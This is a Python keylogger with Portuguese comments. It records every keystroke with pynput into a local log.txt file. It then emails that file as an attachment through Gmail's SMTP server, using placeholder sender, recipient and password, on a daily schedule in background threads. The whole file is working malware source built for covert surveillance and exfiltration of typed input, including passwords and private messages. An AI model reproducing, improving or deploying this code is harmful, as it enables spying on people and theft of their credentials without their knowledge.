from pynput import keyboard     
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from time import sleep
import re
import smtplib
import schedule
import threading

def magic_key():
    #Teclas capturadas
    def on_press(key):
        #Convertendo a chave para str   
        var = str(key)
        #Traduzir as teclas
        var = re.sub(r'Key.space',' ',var)
        var = re.sub(r'Key.enter','\n',var) 
        var = re.sub(r'Key.backspace','',var)
        var = re.sub(r'Key.tab','    ', var)
        var = re.sub(r'Key.shift','',var)
        var = re.sub(r'\'','',var)
        var = re.sub(r'_r','',var)
        var = re.sub(r'Key.caps_lock','',var)
        var = re.sub(r'Key.alt_l','',var)
        var = re.sub(r'Key.ctrl_l','',var)
        #Cria um arquivo para salvar as teclas digitadas
        with open("log.txt","a") as log_file:
            log_file.write(var)

    #Verifica se as teclas foram soltas
    def on_release(key):
        if key == keyboard.Key.esc:
            print(f'{key}')
            return False

    #Ouvir as teclas capturadas 
    with keyboard.Listener(
        on_press=on_press) as listener:
        listener.join()

#Configurando emails
def envio():
    remetente = 'email_remetente'
    destinatario = 'email_destinatario'
    msg = MIMEMultipart()
    msg['From'] = remetente
    msg['To'] = destinatario
    msg['Subject'] = 'Terminal'
    text = 'Terminal'
    msg.attach(MIMEText(text))
    file_text = 'log.txt'
    #Abrindo o arquivo e lendo em formato binary
    attachme = open(file_text, "rb")
    #Definindo MIMETYPES
    base = MIMEBase('text', 'plain')
    #Definindo carga útil e lendo
    base.set_payload((attachme).read())
    #Encodando para base64
    encoders.encode_base64(base)
    #Add Cabeçalho
    base.add_header('Content_Disposition', "attachment: file_nome={0}".format(file_text))
    #attach base
    msg.attach(base)

    #Especificando tipo de email e a porta
    net = smtplib.SMTP('smtp.gmail.com', 587)
    #Dando start do TLS protocolo de segurança
    net.starttls()
    #Login da conta do remetente
    net.login(remetente, '[senha]')
    #Convertendo para string
    text = msg.as_string()
    #Enviando o email
    net.sendmail(remetente,destinatario,text)
    #sair 
    net.quit()

    #Schedule sintax:cada.tempo.fazer
    #Agendando o script
    schedule.every().day.at("22:50").do(envio)
    #schedule.every().day.at("08:00").do(envio)
    while True:
        #A cada 1 segundo vai estar verificando se precisa enviar de novo
        schedule.run_pending()
        sleep(1)

threading.Thread(target=magic_key).start()
threading.Thread(target=envio).start()
